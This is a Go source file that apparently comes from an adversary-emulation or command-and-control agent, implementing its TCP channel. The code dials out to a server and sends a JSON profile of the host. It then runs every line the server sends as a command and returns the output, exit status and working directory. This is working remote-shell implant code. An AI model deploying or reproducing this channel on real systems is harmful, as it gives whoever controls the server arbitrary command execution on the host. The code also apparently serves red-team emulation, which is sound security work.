package sockets

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"

	"../commands"
	"../output"
)

//TCP communication
type TCP struct {}

func init() {
	CommunicationChannels["tcp"] = TCP{}
}

//Listen through a new socket connection
func (contact TCP) Listen(port string, server string, inbound int, profile map[string]interface{}) string {
	conn, err := net.Dial("tcp", port)
	c2 := "tcp"
	if err != nil {
	  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
	} else {
	   handshake(conn, profile)
	   output.VerbosePrint(fmt.Sprintf("[+] TCP established for %s", profile["paw"]))
	   c2 = listen(conn, profile, server)
	   return c2
	}
	return c2
 }

func listen(conn net.Conn, profile map[string]interface{}, server string) string {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        message := scanner.Text()
        if strings.Contains(message, "\t") {
        	return strings.TrimSpace(message)
		}
		bites, status := commands.RunCommand(strings.TrimSpace(message), server, profile)
		pwd, _ := os.Getwd()
		response := make(map[string]interface{})
		response["response"] = string(bites)
		response["status"] = status
		response["pwd"] = pwd
		jdata, _ := json.Marshal(response)
		conn.Write(jdata)
    }
	return "tcp"
}

func handshake(conn net.Conn, profile map[string]interface{}) {
	//write the profile
	jdata, _ := json.Marshal(profile)
    conn.Write(jdata)
	conn.Write([]byte("\n"))

	//read back the paw
    data := make([]byte, 512)
    n, _ := conn.Read(data)
    paw := string(data[:n])
    conn.Write([]byte("\n"))
	profile["paw"] = strings.TrimSpace(string(paw))
}
